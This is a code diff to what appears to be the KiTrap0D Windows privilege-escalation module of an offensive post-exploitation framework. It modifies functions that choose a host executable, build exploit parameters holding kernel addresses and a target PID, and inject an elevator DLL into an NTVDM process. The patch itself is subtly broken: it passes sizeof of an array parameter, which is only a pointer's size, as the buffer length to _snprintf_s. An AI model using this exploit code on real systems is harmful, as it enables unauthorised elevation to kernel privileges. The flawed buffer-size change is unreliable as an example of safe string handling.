@@ -192,7 +192,7 @@ BOOL kitrap0d_spawn_ntvdm( char * cpProgram, HANDLE * hProcess )
 /*
  * Find a suitable exe to host the exploit in.
  */
-BOOL elevate_via_exploit_getpath( char * cpOutput, DWORD dwOutputLength )
+BOOL elevate_via_exploit_getpath( char cpOutput[MAX_PATH], DWORD dwOutputLength )
 {
 	DWORD dwResult         = ERROR_SUCCESS;
 	char cWinDir[MAX_PATH] = {0};
@@ -214,9 +214,9 @@ BOOL elevate_via_exploit_getpath( char * cpOutput, DWORD dwOutputLength )
 				break;
 
 			if( cWinDir[ strlen(cWinDir) - 1 ] == '\\' )
-				_snprintf( cpOutput, dwOutputLength, "%s%s", cWinDir, cpFileName );
+				_snprintf_s( cpOutput, sizeof(cpOutput), dwOutputLength, "%s%s", cWinDir, cpFileName );
 			else
-				_snprintf( cpOutput, dwOutputLength, "%s\\%s", cWinDir, cpFileName );
+				_snprintf_s( cpOutput, sizeof(cpOutput), dwOutputLength, "%s\\%s", cWinDir, cpFileName );
 
 			dprintf( "[KITRAP0D] elevate_via_exploit_getpath. Trying: %s", cpOutput );
 
@@ -283,7 +283,7 @@ DWORD elevate_via_exploit_kitrap0d( Remote * remote, Packet * packet )
 		// 4. Use RDI to inject the elevator dll into the remote NTVDM process...
 		//    Passing in the parameters required by exploit thread via the LoadRemoteLibraryR inject technique.
 
-		_snprintf( cCommandLine, sizeof(cCommandLine), "/KITRAP0D /VDM_TARGET_PID:0x%08X /VDM_TARGET_KRN:0x%08X /VDM_TARGET_OFF:0x%08X\x00", GetCurrentProcessId(), dwKernelBase, dwOffset );
+		_snprintf_s( cCommandLine, sizeof(cCommandLine), sizeof(cCommandLine), "/KITRAP0D /VDM_TARGET_PID:0x%08X /VDM_TARGET_KRN:0x%08X /VDM_TARGET_OFF:0x%08X\x00", GetCurrentProcessId(), dwKernelBase, dwOffset );
 
 		// alloc some space and write the commandline which we will pass to the injected dll...
 		lpRemoteCommandLine = VirtualAllocEx( hVdm, NULL, strlen(cCommandLine)+1, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE ); 
